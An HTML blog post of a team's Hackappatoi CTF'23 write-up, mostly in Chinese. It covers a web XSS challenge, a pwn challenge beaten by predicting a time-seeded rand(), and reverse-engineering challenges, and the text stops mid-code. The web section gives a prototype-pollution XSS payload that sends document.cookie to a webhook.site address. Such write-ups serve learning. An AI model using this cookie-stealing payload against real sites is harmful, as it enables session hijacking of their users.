@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+
+<!--Description-->
+
+
+
+    <meta name="description" content="Team: CakeisTheFakeRank: 12&amp;#x2F;443
+
+WebForza napolia
+[name&amp;#x3D;whale120]  
+
+一個網站，分為兩部分，一個是回報連結然後會檢查是否來自他們的host，另一個則是可以透過url參數做查詢，有xss防護。source:  
+1"/>
+
+
+<!--Author-->
+
+    <meta name="author" content="Naup堇姬"/>
+
+
+<!--Open Graph Title-->
+
+    <meta property="og:title" content="Hackappatoi CTF&#39;23 CakeisTheFake Writeup"/>
+
+
+<!--Open Graph Description-->
+
+    <meta property="og:description" content="Team: CakeisTheFakeRank: 12&amp;#x2F;443
+
+WebForza napolia
+[name&amp;#x3D;whale120]  
+
+一個網站，分為兩部分，一個是回報連結然後會檢查是否來自他們的host，另一個則是可以透過url參數做查詢，有xss防護。source:  
+1"/>
+
+
+<!--Open Graph Site Name-->
+    <meta property="og:site_name" content="堇姬 Naup&#39;s Blog"/>
+
+<!--Type page-->
+
+    <meta property="og:type" content="article"/>
+
+
+<!--Page Cover-->
+
+
+    <meta property="og:image" content="http://example.com/img/bg.jpg"/>
+
+
+<meta name="twitter:card" content="summary_large_image"/>
+
+
+
+
+    <meta name="twitter:image" content="http://example.com/img/bg.jpg"/>
+
+
+<!-- Title -->
+
+<title>Hackappatoi CTF&#39;23 CakeisTheFake Writeup | 堇姬 Naup&#39;s Blog</title>
+
+<!-- Bootstrap Core CSS -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.4.1/dist/css/bootstrap.min.css">
+
+<!-- Custom CSS -->
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<!-- Custom Fonts -->
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" rel="stylesheet" type="text/css"/>
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.0/css/all.min.css" />
+<link href="//fonts.googleapis.com/css2?family=Noto+Sans+TC:wght@100;300;400;500;700;900&display=swap" rel="stylesheet">
+<link href="//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" rel="stylesheet" type="text/css"/>
+
+<!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+<!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+<!--[if lt IE 9]>
+<script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+<script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+<![endif]-->
+
+<!-- Gallery -->
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/featherlight@1.4.0/src/featherlight.css" integrity="sha256-30DV/STftlyQ6v8yaOWlabammvCYtRJERLj/m0b3zno=" crossorigin="anonymous">
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/lightgallery@1.6.11/dist/css/lightgallery.min.css">
+
+<!-- favicon -->
+
+<link rel="icon" href="/img/icon.jpg"/>
+
+
+
+    <!-- Google Analytics -->
+    
+
+
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.1.1"></head>
+<!-- Head tag -->
+
+<body>
+
+    <!-- Menu -->
+    <!-- Navigation -->
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top bg-transparent position-absolute w-100 p-0" id="nav">
+    <div class="container pl-0 pr-0">
+        <!-- Brand and toggle get grouped for better mobile display -->
+        <div class="navbar-header page-scroll">
+            <a class="navbar-brand text-white p-1 pl-3" href="/">堇姬 Naup's Blog</a>
+        </div>
+        <div class="navbar-nav float-right">
+            <button class="btn btn-link search-btn navbar-item" data-toggle="modal" data-target="#searchModal">
+                <i class="fas fa-search"></i>
+            </button>
+        </div>
+    </div>
+    <!-- /.container -->
+</nav>
+
+    <!-- Main Content -->
+    <!-- Page Header -->
+<!-- Set your background image for this header in your post front-matter: cover -->
+
+<header class="intro-header" style="background-image: url('/img/bg.jpg')">
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-12 col-md-12 text-center">
+                <div class="post-heading text-white">
+                    <h1>Hackappatoi CTF'23 CakeisTheFake Writeup</h1>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+<!-- Post Content -->
+<article>
+    <div class="container">
+        <div class="row">
+            <!-- Post Main Content -->
+            <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+                
+                    <span class="meta d-inline-block">
+    
+    
+    <!-- Date -->
+    
+        <span class="post-meta-split">&nbsp;|&nbsp;</span>
+        <i class="far fa-calendar-check fa-fw"></i>
+        2024-02-29
+    
+    <!-- word count and read count -->
+    
+
+    
+
+    
+</span>  
+                
+                <blockquote>
+<p>Team: CakeisTheFake<br>Rank: 12&#x2F;443</p>
+</blockquote>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Forza-napolia"><a href="#Forza-napolia" class="headerlink" title="Forza napolia"></a>Forza napolia</h2><blockquote>
+<p>[name&#x3D;whale120]  </p>
+</blockquote>
+<p>一個網站，分為兩部分，一個是回報連結然後會檢查是否來自他們的host，另一個則是可以透過url參數做查詢，有xss防護。<br>source:  </p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> bot = <span class="built_in">require</span>(<span class="string">&quot;../bot&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isValidUrl</span>(<span class="params">url</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> regex = <span class="regexp">/^(http|https):\/\/(www\.)&#123;0,1&#125;forzanapoli.hackappatoi.com/i</span>;</span><br><span class="line">    <span class="keyword">return</span> regex.<span class="title function_">test</span>(url) &amp;&amp; !url.<span class="title function_">includes</span>(<span class="string">&quot;@&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">router</span>(<span class="params">fastify, options</span>) &#123;</span><br><span class="line">    fastify.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> reply.<span class="title function_">sendFile</span>(<span class="string">&quot;index.html&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    fastify.<span class="title function_">get</span>(<span class="string">&quot;/share&quot;</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">        <span class="keyword">return</span> reply.<span class="title function_">sendFile</span>(<span class="string">&quot;share.html&quot;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    fastify.<span class="title function_">post</span>(<span class="string">&quot;/share&quot;</span>, <span class="keyword">async</span> (request, reply) =&gt; &#123;</span><br><span class="line">        <span class="keyword">let</span> &#123; url &#125; = request.<span class="property">body</span>;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;\nSHARE&quot;</span>);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;original url:&quot;</span>, url);</span><br><span class="line">        <span class="keyword">if</span> (url &amp;&amp; <span class="keyword">typeof</span> url == <span class="string">&quot;string&quot;</span> &amp;&amp; url != <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> valid = <span class="title function_">isValidUrl</span>(url);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;valid url:&quot;</span>, valid);</span><br><span class="line">            <span class="keyword">if</span> (valid) &#123;</span><br><span class="line">                bot.<span class="title function_">checkUrl</span>(url); <span class="comment">// Set the cookies and visit url</span></span><br><span class="line">                <span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">&quot;/templates/success.ejs&quot;</span>, &#123; <span class="attr">message</span>: <span class="string">&quot;The admin will check your link ASAP. Thanks!&quot;</span> &#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> reply.<span class="title function_">view</span>(<span class="string">&quot;/templates/success.ejs&quot;</span>, &#123; <span class="attr">message</span>: <span class="string">&quot;Invalid URL! You are not a real Napoli fan 😡&quot;</span> &#125;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> reply.<span class="title function_">code</span>(<span class="number">400</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">view</span>(<span class="string">&quot;/templates/error.ejs&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">400</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Missing parameters :(&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    fastify.<span class="title function_">setNotFoundHandler</span>(<span class="function">(<span class="params">request, reply</span>) =&gt;</span> &#123;</span><br><span class="line">        reply.<span class="title function_">code</span>(<span class="number">404</span>).<span class="title function_">type</span>(<span class="string">&quot;text/html&quot;</span>).<span class="title function_">view</span>(<span class="string">&quot;/templates/error.ejs&quot;</span>, &#123;</span><br><span class="line">            <span class="attr">code</span>: <span class="number">404</span>,</span><br><span class="line">            <span class="attr">message</span>: <span class="string">&quot;Page not found :(&quot;</span>,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">module</span>.<span class="property">exports</span> = <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> router;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>賽中沒有做出來有點可惜，不過現在學會啦~~<br>參考jquery的這份弱點就可以透過proto pollution構造payload引發xss：<br><a target="_blank" rel="noopener" href="https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md">https://github.com/BlackFan/client-side-prototype-pollution/blob/master/gadgets/jquery.md</a><br>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://forzanapoli.hackappatoi.com/?__proto__[preventDefault]=x&amp;__proto__[handleObj]=x&amp;__proto__[delegateTarget]=%3Cimg/src/onerror%3dfetch(%27//webhook.site/14e00053-0cc1-4bb0-b9d5-81cb05f1f1a4?1337%27%2Bbtoa(document.cookie))%3E&amp;name=1</span><br></pre></td></tr></table></figure>
+<h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><h2 id="Pizza-Spaghetti-Espresso"><a href="#Pizza-Spaghetti-Espresso" class="headerlink" title="Pizza Spaghetti Espresso"></a>Pizza Spaghetti Espresso</h2><blockquote>
+<p>[name&#x3D;whale120]  </p>
+</blockquote>
+<p>一個很<strong>另類</strong>的猜拳遊戲，而玩家必須完美十場全勝才可以拿shell<br>所有防護只有PARTIAL RELRO跟STACK CANARY不存在有弱點。<br>先把執行檔丟到ghidra：<br><div class="img-item" data-src="https://hackmd.io/_uploads/Sy27h1fUT.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sy27h1fUT.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>此外，讀取的時候也都會乖乖只讀取十六個字元，也沒辦法利用前面說的弱點打Buffer Overflow之類的。<br>經過觀察，發現每次都是用時間作為種子產生<code>rand()</code>，這時就嘗試寫一個執行黨用相同方式產生亂數：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">hack</span><span class="params">(<span class="type">int</span> x)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">0</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Pizza\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">1</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Espresso\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(x==<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Spaghetti\n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// your code goes here</span></span><br><span class="line">        <span class="comment">//[&quot;Pizza&quot;, &quot;Espresso&quot;, &quot;Spaghetti&quot;];</span></span><br><span class="line">        <span class="type">time_t</span> t=time(<span class="number">0</span>);</span><br><span class="line">        srand(((<span class="type">unsigned</span> <span class="type">int</span>)t));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i=<span class="number">0</span>;i&lt;<span class="number">10</span>;i++)&#123;</span><br><span class="line">                hack((rand()+<span class="number">1</span>)%<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>接著在本地同時執行：<br><code>./localpsehacker &amp;&amp; ./pse</code><br>可以成功預測到最後並get shell，最後丟<code>nc</code>，remote的時候<code>time_t</code>值我有加一因為會有執行檔結束到連線之間的時間差。<br><code>./psehacker &amp;&amp; nc 92.246.89.201 10001</code></p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/Sy_LBkQUa.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Sy_LBkQUa.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<h1 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h1><h2 id="Thefourhorseman"><a href="#Thefourhorseman" class="headerlink" title="Thefourhorseman"></a>Thefourhorseman</h2><blockquote>
+<p>[name&#x3D;FlyDragon]</p>
+</blockquote>
+<p>flag 就在 sub_11C9() 蠻無聊的</p>
+<p><div class="img-item" data-src="https://hackmd.io/_uploads/H1-1noUU6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H1-1noUU6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
+<blockquote>
+<p>FLAG : <code>hctf&#123;youre_ready_to_stop_the_apocalypse&#125;</code></p>
+</blockquote>
+<h2 id="Thefirsthorseman"><a href="#Thefirsthorseman" class="headerlink" title="Thefirsthorseman"></a>Thefirsthorseman</h2><blockquote>
+<p>[name&#x3D;FlyDragon]</p>
+</blockquote>
+<p>是個 .pyc 檔案，但 python 版本 &gt; 3.9 不能用 uncompyle6，所以用 pycdc 還原成 .py 檔案</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;You&#x27;ve inserted the key you found on the mysterious Laptop and you&#x27;ve been teleported to a place you don&#x27;t know.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;All you can see is an enormous door keeping a castle safe. You approach it and with a bit of fear proceed to open it.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;In the middle of the hall you see a funny man, it seems the court jester, but still he scares you.&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&#x27;SHISH, SHISH&#x27; is the only thing he says, and now you realize he is the first horseman, ready to stop you from reaching further in your mission.&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The man walks towards you and tries to hit you multiple times! Avoid his punches!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shish</span>():</span><br><span class="line">    exit(<span class="string">&quot;The funny man manages to hit you. You fall on the ground.\nYou don&#x27;t remember anything. All you know now is a word...\nSHISH\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">f = [</span><br><span class="line">    <span class="string">&#x27;r3st&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;4s_a&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;b3_c&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;m4tt&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;l3t_&#x27;</span>]</span><br><span class="line">l = [</span><br><span class="line">    <span class="string">&#x27;4ll0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;30_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;7t3_&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;jkin&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;p1ck&#x27;</span>]</span><br><span class="line">a = [</span><br><span class="line">    <span class="string">&#x27;5_th&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3_4n&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1t_1&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;00p5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1n_1&#x27;</span>]</span><br><span class="line">g = [</span><br><span class="line">    <span class="string">&#x27;p1_7&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;3_w0&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;t0g3&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;00_k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;n0th&#x27;</span>]</span><br><span class="line">s = [</span><br><span class="line">    <span class="string">&#x27;ear5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;k!1!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1n6!&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;33p5&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;rd_!&#x27;</span>]</span><br><span class="line">counter = <span class="number">0</span></span><br><span class="line">indexes = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_flag</span>():</span><br><span class="line">    flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    flag += f[indexes[<span class="number">0</span>]]</span><br><span class="line">    flag += l[indexes[<span class="number">1</span>]]</span><br><span class="line">    flag += a[indexes[<span class="number">2</span>]]</span><br><span class="line">    flag += g[indexes[<span class="number">3</span>]]</span><br><span class="line">    flag += s[indexes[<span class="number">4</span>]]</span><br><span class="line">    flag = <span class="string">&#x27;upgs&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">    flag = codecs.encode(flag, <span class="string">&#x27;rot13&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;<span class="subst">&#123;t&#125;</span>...&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        counter = t</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    shish()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">4</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nYou dodged it\n&#x27;</span>)</span><br><span class="line">        indexes.append(counter - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;<span class="subst">&#123;t&#125;</span>...&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        counter = t</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    shish()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nYou dodged it\n&#x27;</span>)</span><br><span class="line">        indexes.append(counter - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;<span class="subst">&#123;t&#125;</span>...&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        counter = t</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    shish()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nYou dodged it\n&#x27;</span>)</span><br><span class="line">        indexes.append(counter - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;<span class="subst">&#123;t&#125;</span>...&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        counter = t</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    shish()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nYou dodged it\n&#x27;</span>)</span><br><span class="line">        indexes.append(counter - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&#x27;&#x27;<span class="subst">&#123;t&#125;</span>...&#x27;&#x27;&#x27;</span>)</span><br><span class="line">        counter = t</span><br><span class="line">        sleep(<span class="number">1</span>)</span><br><span class="line">    shish()</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">    <span class="keyword">if</span> counter == <span class="number">5</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\nYou dodged it\n&#x27;</span>)</span><br><span class="line">        indexes.append(counter - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        shish()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;The man is tired, he just hands you a slip of paper, to open the next door.\nThis is what you read&#x27;</span>)</span><br><span class="line">print_flag()</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;The man then says his last words...\n 